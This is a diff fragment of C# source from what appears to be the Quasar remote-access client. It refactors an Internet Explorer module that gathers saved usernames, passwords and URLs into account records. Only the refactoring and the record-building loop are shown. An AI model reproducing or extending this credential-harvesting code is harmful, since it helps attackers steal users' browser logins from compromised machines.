@@ -1,4 +1,7 @@
-﻿using System;
+﻿using Microsoft.Win32;
+using Quasar.Client.Helper;
+using Quasar.Common.Models;
+using System;
 using System.Collections;
 using System.Collections.Generic;
 using System.ComponentModel;
@@ -7,16 +10,16 @@ using System.Linq;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
-using Microsoft.Win32;
-using Quasar.Client.Helper;
-using Quasar.Common.Models;
 
 namespace Quasar.Client.Recovery.Browsers
 {
-    public static class InternetExplorer
+    public class InternetExplorerPassReader : IAccountReader
     {
+
+        public string ApplicationName => "Internet Explorer";
+
         #region Public Members
-        public static List<RecoveredAccount> GetSavedPasswords()
+        public IEnumerable<RecoveredAccount> ReadAccounts()
         {
             List<RecoveredAccount> data = new List<RecoveredAccount>();
 
@@ -34,25 +37,29 @@ namespace Quasar.Client.Recovery.Browsers
                             {
                                 foreach (string[] loginInfo in dataList)
                                 {
-                                    data.Add(new RecoveredAccount() { Username = loginInfo[0], Password = loginInfo[1], Url = item.UrlString, Application = "InternetExplorer" });
+                                    data.Add(new RecoveredAccount()
+                                    {
+                                        Username = loginInfo[0],
+                                        Password = loginInfo[1],
+                                        Url = item.UrlString,
+                                        Application = ApplicationName
+                                    });
                                 }
                             }
                         }
                         catch (Exception)
                         {
-                            // TODO: Add packet sending for error
                         }
                     }
                 }
             }
             catch (Exception)
             {
-                // TODO: Add packet sending for error
             }
 
             return data;
         }
-        
+
         public static List<RecoveredAccount> GetSavedCookies()
         {
             return new List<RecoveredAccount>();
@@ -327,7 +334,6 @@ namespace Quasar.Client.Recovery.Browsers
 
     public class ExplorerUrlHistory : IDisposable
     {
-
         private readonly IUrlHistoryStg2 obj;
         private UrlHistoryClass urlHistory;
         private List<STATURL> _urlHistoryList;
@@ -1155,5 +1161,5 @@ namespace Quasar.Client.Recovery.Browsers
 
 
     }
-#endregion
+    #endregion
 }
